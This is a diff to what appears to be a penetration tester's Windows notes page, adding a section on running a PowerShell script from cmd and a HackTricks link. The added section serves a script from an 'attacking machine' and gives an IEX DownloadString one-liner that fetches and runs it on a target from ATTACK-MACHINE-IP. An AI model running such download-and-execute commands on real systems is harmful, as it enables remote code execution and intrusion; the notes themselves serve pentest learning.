@@ -223,6 +223,13 @@ C:\Program Files\Windows PowerShell\*
 
 - We can use [Rundll32](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)``
 
+### Execute powershell file
+
+- Sometimes powershell won't launch so we will have to use cmd. It is possible to execute a ps1 script using this trick
+  - We take the necessary script in our attacking machine
+  - `python3 -m http.server 80` we serve it to our target with an http server
+  - `echo IEX(New-Object Net.WebClient).DownloadString('http://ATTACK-MACHINE-IP/script.ps1` we can use this command to download and execute it in our target.
+
 ## Sysinternals
 
 ### Pipelist
@@ -250,3 +257,4 @@ C:\Program Files\Windows PowerShell\*
 
 {% embed url="https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/07-working-with-wmi?view=powershell-7.1" %} Working with wmic {% endembed %}  
 {% embed url="https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7" %} Approved verbs for Powershell {% endembed %}  
+{% embed url="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters" %} Basic Powershell for penteter on HackTricks {% endembed %}  
